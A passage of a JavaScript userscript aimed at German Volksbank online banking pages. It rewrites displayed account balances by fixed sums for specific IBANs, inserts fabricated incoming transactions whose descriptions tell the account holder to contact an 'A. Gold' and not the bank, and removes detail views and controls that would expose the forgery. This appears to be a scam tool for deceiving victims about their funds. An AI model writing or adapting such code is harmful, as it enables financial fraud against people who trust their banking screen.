    if (carrier) carrier.removeAttribute('data-e2e-umsatz-list-item');

    // Mark our node and store a stable ISO date string
    const d = parseDateFromShortDe(tx.date);
    if (clone instanceof HTMLElement && d) {
      clone.dataset.customTx = '1';
      clone.dataset.customDate = dateToISODateNoTZShift(d);
    }

    clone.classList.add('custom-transaction');
  }

  /**
   * Find the reference node for date-based placement (closest older).
   * We scan all *real* items and pick the one with the largest date < targetDate.
   * Insert BEFORE that item.
   */
  function findReferenceForDateClosestOlder(container, targetDate) {
    const items = container.querySelectorAll('app-umsatz-list-item');
    let best = null;
    let bestDate = null;
    for (const item of items) {
      if (item.classList.contains('custom-transaction')) continue;
      const d = getItemDate(item);
      if (!d) continue;
      if (d < targetDate) {
        if (!bestDate || d > bestDate) {
          best = item;
          bestDate = d;
        }
      }
    }
    return best; // insert BEFORE best
  }

  function isListItemElement(el) {
    return !!(el && el.tagName && el.tagName.toLowerCase() === 'app-umsatz-list-item');
  }

  /**
   * Move a node up/down among its siblings by N steps.
   * steps > 0  -> move up N steps
   * steps < 0  -> move down N steps
   */
  function moveBySteps(node, steps) {
    steps = parseInt(steps, 10) || 0;
    if (!steps || !node || !node.parentElement) return;

    const parent = node.parentElement;

    if (steps > 0) {
      let remaining = steps;
      while (remaining > 0) {
        let prev = node.previousElementSibling;
        while (prev && !isListItemElement(prev)) prev = prev.previousElementSibling;
        if (!prev) break;
        parent.insertBefore(node, prev);
        remaining--;
      }
    } else if (steps < 0) {
      let remaining = Math.abs(steps);
      while (remaining > 0) {
        let next = node.nextElementSibling;
        while (next && !isListItemElement(next)) next = next.nextElementSibling;
        if (!next) break;
        const after = next.nextElementSibling;
        if (after) parent.insertBefore(node, after);
        else parent.appendChild(node);
        remaining--;
      }
    }

    node.dataset.customMovedSteps = String(steps);
  }

  /**
   * Place node at default position (top or by date) without move offset.
   */
  function placeByStrategy(container, node, tx) {
    if (tx.insertAtTop) {
      container.insertBefore(node, container.firstElementChild);
      return;
    }
    const targetDate = parseDateFromShortDe(tx.date);
    if (!targetDate) {
      container.appendChild(node);
      return;
    }
    const ref = findReferenceForDateClosestOlder(container, targetDate);
    if (ref) container.insertBefore(node, ref);
    else container.appendChild(node);
  }

  function buildClone(baseItem, tx) {
    const clone = baseItem.cloneNode(true);
    sanitizeClone(clone, tx);
    updateText(clone, '.umsatz-name.text-truncate', tx.title);
    updateText(clone, '.verwendungszweck-label.text-truncate', tx.description ?? '');
    setAmountAndSign(clone, tx.amount);
    setBuchungZeit(clone, tx.date);
    return clone;
  }

  /**
   * Ensure a transaction node exists and is positioned according to:
   *  - default strategy (top or date-based closest-older)
   *  - then offset by moveSteps
   */
  function upsertAndPlaceTransaction(container, baseItem, tx) {
    const key = createKey(tx);
    txConfigByKey.set(key, tx);

    let node = insertedNodes.get(key);
    if (!(node && node.isConnected && container.contains(node))) {
      node = buildClone(baseItem, tx);
      insertedNodes.set(key, node);
    }

    // Default placement
    placeByStrategy(container, node, tx);

    // Apply relative move
    moveBySteps(node, tx.moveSteps || 0);

    // Verify presence
    if (!(node.isConnected && container.contains(node))) {
      warn(`Verification failed: "${tx.title}" not connected after placement.`);
    }
  }

  function processTick() {
    try {
      const container = findContainer();
      if (!container) return;
      if (!isTargetAccount()) return;

      const baseItem = findBaseItem(container);
      if (!baseItem) return;

      for (const tx of TRANSACTIONS) {
        upsertAndPlaceTransaction(container, baseItem, tx);
      }

      // Clean up entries whose nodes disappeared
      for (const [key, node] of insertedNodes.entries()) {
        if (!(node && node.isConnected && container.contains(node))) {
          const cfg = txConfigByKey.get(key);
          if (cfg) {
            log(`Node for "${cfg.title}" missing; will recreate next tick.`);
          }
          insertedNodes.delete(key);
        }
      }
    } catch (e) {
      err('Tick error:', e);
    }
  }

  setInterval(processTick, TICK_MS);
 }
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------

//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE EACH TRANSACTION BAL CHANGE---------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    "use strict";

//    // Define the target text content to search for (case and whitespace insensitive)
//    var targetTextContent1 = "DE12 7656 0060";
//    var targetTextContent2 = " 0001 5370 59";
//
//    // Modify amount
//  var IBmodificationAmount = 15000.0;
//
//    // Your date rule → modify all from MIN_DAY. Dez. and newer
//    const MIN_DAY = 3;
//    const MIN_MONTH = 12; // December

    // Per-element cache to allow multiple balances updating independently
    const balanceCache = new WeakMap();
    const modifiedCache = new WeakMap();

    // Parse European currency into float
    function parseEuroToFloat(str) {
        return parseFloat(
            str.replace(/\./g, "").replace(",", ".").replace(/[^\d.-]/g, "")
        );
    }

    // Format float into DE currency (without EUR suffix)
    function formatNumberDE(value) {
        return value.toLocaleString("de-DE", {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Convert "2. Dez." into JS date object with fixed year
    function parseGermanDate(dateText) {
        const monthMap = {
            "Jan": 1, "Feb": 2, "Mär": 3, "Apr": 4, "Mai": 5, "Jun": 6,
            "Jul": 7, "Aug": 8, "Sep": 9, "Okt": 10, "Nov": 11, "Dez": 12
        };

        const match = dateText.match(/(\d+)\.\s+([A-Za-zäöüÄÖÜ]+)/);
        if (!match) return null;

        const day = parseInt(match[1], 10);
        const month = monthMap[match[2]] || null;

        if (!month) return null;

        return { day, month };
    }

    // Check if date >= MIN_DAY.MIN_MONTH
    function isDateEligible(day, month) {
        if (month > MIN_MONTH) return true;
        if (month < MIN_MONTH) return false;
        return day >= MIN_DAY;
    }

    // Check if IBAN matches required template
    function ibanMatches() {
        const ibanElement = document.querySelector(".konto-iban");
        if (!ibanElement) return false;

        const plainIban = ibanElement.textContent.toLowerCase().replace(/\s+/g, "");
        const t1 = targetTextContent1.toLowerCase().replace(/\s+/g, "");
        const t2 = targetTextContent2.toLowerCase().replace(/\s+/g, "");

        return plainIban.includes(t1) && plainIban.includes(t2);
    }

    function modifySaldoElement(saldoSpan, originalValue) {
        const modifiedValue = originalValue + IBmodificationAmount;
        modifiedCache.set(saldoSpan, modifiedValue);

        saldoSpan.textContent = formatNumberDE(modifiedValue);
        saldoSpan.setAttribute("data-positive", modifiedValue >= 0 ? "1" : "0");

        // Remove EUR duplicates
        const parent = saldoSpan.parentElement;
        parent.querySelectorAll("span").forEach(s => {
            if (s !== saldoSpan && s.textContent.trim() === "EUR") {
                s.remove();
            }
        });

        console.log(
            `[MODIFIED] saldo=${formatNumberDE(modifiedValue)} | original=${originalValue}`
        );
    }

    function processAllBalances() {
        if (!ibanMatches()) {
            console.log("[CHECK] IBAN mismatch → skipping all balances");
            return;
        }

        const saldoBlocks = document.querySelectorAll(
            '[data-e2e-saldo-nach-buchung-container] span[data-positive]'
        );

        saldoBlocks.forEach(saldoSpan => {
            const textValue = saldoSpan.textContent.trim();
            const pageValue = parseEuroToFloat(textValue);

            // Find associated date for this saldo
            const detailBlock = saldoSpan.closest(".umsatz-item-detail-content");
            if (!detailBlock) return;

            const dateSpan = detailBlock.querySelector(
                "[data-e2e-umsatzdetail-valuta] span[aria-hidden]"
            );
            if (!dateSpan) return;

            const transDate = parseGermanDate(dateSpan.textContent.trim());
            if (!transDate) return;

            const eligible = isDateEligible(transDate.day, transDate.month);
            if (!eligible) {
                console.log(
                    `[CHECK] Skipping (date too old): ${transDate.day}.${transDate.month}`
                );
                return;
            }

            // INITIAL CACHE
            if (!balanceCache.has(saldoSpan)) {
                balanceCache.set(saldoSpan, pageValue);
                console.log(
                    `[CACHE_INIT] day=${transDate.day}.${transDate.month} | value=${pageValue}`
                );
                return;
            }

            const cachedValue = balanceCache.get(saldoSpan);
            const lastMod = modifiedCache.get(saldoSpan);

            // TRUE PAGE UPDATE (not by script)
            if (pageValue !== cachedValue && pageValue !== lastMod) {
                balanceCache.set(saldoSpan, pageValue);
                console.log(
                    `[CACHE_UPDATE] Real page update → cache=${pageValue}`
                );
                return;
            }

            // PAGE MATCHES ORIGINAL → modify
            if (pageValue === cachedValue) {
                modifySaldoElement(saldoSpan, cachedValue);
            }

            console.log(
                `[CHECK] OK | date=${transDate.day}.${transDate.month} | page=${pageValue} | cache=${cachedValue}`
            );
        });
    }

    // Run every 100 ms continuously
    setInterval(processAllBalances, 100);
  }





//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

//    // Define the target text contents to search for (case and whitespace insensitive)
//    var targetTextContent1 = "DE02 5606 1472";
 //  var targetTextContent2 = "0008 3176 19";

//    // Configurable modification amount (positive or negative)
//   const modificationAmount = 400.0; // Adjust the amount as needed



    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }
//--------------------------------------------------------------------------------------

// Function to remove parent elements of specified elements and observe DOM changes

    function removeParentElementsAndObserve() {
        try {
            const elements = document.querySelectorAll('.kf-account-changer-hint-value');
            if (elements.length > 0) {
                elements.forEach(el => {
                    if (el.parentNode) {
                        console.log('[UserScript] Removing parent of element:', el);
                        el.parentNode.remove();
                    }
                });
            }
        } catch (err) {
            console.error('[UserScript] Error while removing elements:', err);
        }
    }

    // Run every 100ms
    setInterval(removeParentElementsAndObserve, 100);

// Call the function to start removing parent elements and observe DOM changes
removeParentElementsAndObserve();



    //---------------------------------------------------------------------------------------------------------------
// Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the ".kf-account-iban" element within the ".remitter" class
    var ibanTextContent = document.querySelector('.kf-account-iban').textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if both target text contents are found within the "kf-account-iban" element
    if (ibanTextContent.includes(lowerCaseTargetTextContent1) && ibanTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}






    // Check for conditions at regular intervals
    setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

    console.log('Volks umsatze utility functions userscript initiated.');

    // Function to remove elements with "submenu" in their class names
    function removeElementsWithSubmenuClass() {
        const elementsToRemove = document.querySelectorAll('[class*="submenu"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "submenu" in class name:', element);
        });
    }

    // Function to remove elements with "select-arrow" in their class names
    function removeElementsWithSelectArrowClass() {
        const elementsToRemove = document.querySelectorAll('[class*="select-arrow"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "select-arrow" in class name:', element);
        });
    }

    // Function to remove elements with aria-label="Details" and their parent with class "ng-star-inserted"
    function removeUnwantedElements() {
        const elementsToRemove = document.querySelectorAll('[aria-label="Details"]');
        elementsToRemove.forEach(element => {
            const parent = element.closest('.ng-star-inserted');
            if (parent) {
                parent.remove();
                console.log('Removed parent element:', parent);
            }
        });
    }

    // Function to remove elements with the class "chevron"
    function removeElementsWithChevronClass() {
        const elementsToRemove = document.querySelectorAll('.chevron');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "chevron":', element);
        });
    }

    // Function to remove elements with the class "umsatz-item-detail-shredder"
    function removeElementsWithDetailClass() {
        const elementsToRemove = document.querySelectorAll('.umsatz-item-detail-shredder');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "umsatz-item-detail-shredder":', element);
        });
    }

    // Function to prevent default click behavior for elements under "mat-form-field-wrapper"
    function preventClickUnderMatFormFieldWrapper(event) {
        const matFormFieldWrapper = document.querySelector('[class*="mat-form-field-wrapper"]');
        if (matFormFieldWrapper && (matFormFieldWrapper.contains(event.target) || event.target.matches('[class*="mat-form-field-wrapper"]'))) {
            event.stopPropagation();
            event.preventDefault();
        }
    }

    // Function to remove elements with role="listbox"
    function removeElementsWithListboxRole() {
        const elementsToRemove = document.querySelectorAll('[role="listbox"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with role="listbox":', element);
        });
    }



    // Add click event listener to prevent default behavior under "mat-form-field-wrapper"
    document.addEventListener('click', preventClickUnderMatFormFieldWrapper);



    // Initial removal of unwanted elements
    removeUnwantedElements();
    removeElementsWithSubmenuClass();
    removeElementsWithSelectArrowClass();
    removeElementsWithChevronClass();
    removeElementsWithDetailClass();
    removeElementsWithListboxRole(); // Add initial removal of elements with role="listbox"
})();

}


//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------


}

//--------------------------------===============================================================================-----------




/// SECOND ACCOUNT



//-------------------------------------------------------------------------


//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE85 2926 5747";
    var targetTextContent2 = " 6003 3851 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 37400.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
//    const timeoutMillis = 0; // Adjust the timeout as needed



    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('[data-positive]');

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // Update the data-positive attribute based on the new balance sign
                parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }



    // Check for conditions at regular intervals
    setInterval(checkForConditions, 2); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();


}



//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0) {

    (function() {
        'use strict';

        // Configurable timeout value (in milliseconds)
 //       const TIMEOUT_MS = 0; // Change this value as needed

//        // Define the target text content to search for (case and whitespace insensitive)
        var targetTextContent1 = "DE85 2926 5747";
        var targetTextContent2 = " 6003 3851 00";

        // Array of configurable transactions
        const TRANSACTIONS = [

              {
           title: 'Aedo s.r.o : JP',
            description: ' Wenden Sie sich an A. Gold, nicht die Bank, damit nicht gesperrt.',
           amount: '18.700,00',
            date: '20. Mär.',
          insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
            moveDirectionDown: false, // Set to false to move up
            order: 2 // Specify the order in which the transaction should be inserted
        },
  {
           title: 'Aedo s.r.o : JP',
            description: '2 Wenden Sie sich an A. Gold, nicht die Bank, damit nicht gesperrt.',
           amount: '18.700,00',
            date: '24. Mär.',
          insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
            moveDirectionDown: false, // Set to false to move up
            order: 3 // Specify the order in which the transaction should be inserted
        },
//            {
 //               title: 'Payward Limited',
 //               description: 'Geld für Steuern',
 //               amount: '37.000,00',
 //               date: '26. Nov.',
//                insertAfter: false, // Set to false to insert before the original transaction
 //               moveStes: 0, // Number of steps to move the transaction
 //               moveDirectionDown: true, // Set to false to move up
  //              order: 1 // Specify the order in which the transaction should be inserted
  //          },
            // Add more transaction configurations here
      ];

        // Sort transactions based on the 'order' property
        TRANSACTIONS.sort((a, b) => a.order - b.order);

        console.log('Userscript initiated.');




       // Function to process transactions
function processTransactions() {
    console.log('Processing multiple transactions.');

    // Check if both target text contents are found on the page
    const textFound = checkTextContent(targetTextContent1, targetTextContent2);

    if (textFound) {
        // Select the target element
        var targetElement = document.querySelector('app-umsatz-list-optimized');
        console.log('Searching for target element...');

        // Check if the target element exists
        if (!targetElement) {
            console.error('Target element not found');
            return;
        }
        console.log('Target element found:', targetElement);

        // Check if transactions have already been inserted
        if (!targetElement.querySelector('.custom-transaction')) {
            TRANSACTIONS.forEach((transaction, index) => {
                console.log(`Processing transaction ${index + 1}`);
                insertAndMoveTransaction(targetElement, transaction);
            });
        } else {
            console.log('Transactions have already been inserted.');
        }
    } else {
        console.log('Text contents not found on the page. Waiting for them to appear...');
    }
}


// Function to check if a text content is found on the page (case and whitespace insensitive)
function checkTextContent(text1, text2) {
    const pageText = document.querySelector('.konto-iban').textContent.replace(/\s/g, '').toLowerCase();
    const textToCheck1 = text1.replace(/\s/g, '').toLowerCase();
    const textToCheck2 = text2.replace(/\s/g, '').toLowerCase();

    return pageText.includes(textToCheck1) && pageText.includes(textToCheck2);
}






    // Function to insert and move a transaction
    function insertAndMoveTransaction(targetElement, config) {
        // Get the first child of the target element
        var firstChild = targetElement.firstElementChild;
        if (!firstChild) {
            console.error('No first child found in the target element');
            return;
        }

        // Clone the first child
        var clone = firstChild.cloneNode(true);

        // Add a class to identify custom transactions
        clone.classList.add('custom-transaction');

        // Customization of cloned child
        updateElementTextContent(clone, '.umsatz-name.text-truncate', config.title);
        updateElementTextContent(clone, '.verwendungszweck-label.text-truncate', config.description);
        setCustomAmountAndCurrency(clone, config.amount);
        updateElementTextContent(clone, '.d-flex.justify-content-end.buchung-zeit', config.date);

        // Insert the cloned node based on the configuration
        var referenceNode = config.insertAfter ? firstChild.nextSibling : firstChild;
        targetElement.insertBefore(clone, referenceNode);

        // Move the cloned node based on the configuration
        moveTransaction(clone, config.moveSteps, config.moveDirectionDown);
    }

    // Helper function to update text content of an element within the clone
    function updateElementTextContent(clone, selector, newText) {
        const element = clone.querySelector(selector);
        if (element) {
            console.log(`Found element for selector '${selector}', updating text content.`);
            element.textContent = newText;
        } else {
            console.error(`Element not found for selector '${selector}'.`);
        }
    }

    // Function to set custom amount and update currency positivity based on the amount's sign
    function setCustomAmountAndCurrency(clone, amount) {
        const amountElement = clone.querySelector('.text-right.konto-umsatz-saldo-shredder span');
        const currencyElement = clone.querySelector('.waehrung-shredder.text-left span');
        const isPositive = !amount.startsWith('-'); // Determines positivity based on amount's sign

        if (amountElement && currencyElement) {
            console.log('Found amount and currency elements:', amountElement, currencyElement);
            amountElement.textContent = amount;
            amountElement.setAttribute('data-positive', isPositive ? '1' : '0');
            currencyElement.setAttribute('data-positive', isPositive ? '1' : '0');
        } else {
            console.error('Amount or currency element not found.');
        }
    }

    // Function to move the transaction up or down by a specified number of steps
    function moveTransaction(transactionNode, steps, moveDown) {
        let currentNode = transactionNode;
        while (steps > 0 && currentNode) {
            currentNode = moveDown ? currentNode.nextSibling : currentNode.previousSibling;
            steps--;
        }

        if (currentNode) {
            const referenceNode = moveDown ? currentNode.nextSibling : currentNode;
            transactionNode.parentNode.insertBefore(transactionNode, referenceNode);
            console.log('Transaction moved.');
        } else {
            console.error('Unable to move transaction: Reached the end of the list.');
        }
    }

    // Continuously check for the presence of transactions every 2 seconds
    setInterval(processTransactions, 100);

})();


}


//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------

//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    'use strict';

//    // Define the target text contents to search for (case and whitespace insensitive)
   var targetTextContent1 = "DE85 2926 5747";
    var targetTextContent2 = " 6003 3851 00";

//    // Configurable modification amount (positive or negative)
  const modificationAmount = 37400.0; // Adjust the amount as needed


    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }

// Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the ".kf-account-iban" element, convert to lowercase, and trim whitespace
    var ibanTextContent = document.querySelector('.kf-account-iban').textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if both target text contents are found within the "kf-account-iban" element
    if (ibanTextContent.includes(lowerCaseTargetTextContent1) && ibanTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}





    // Check for conditions at regular intervals
    setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
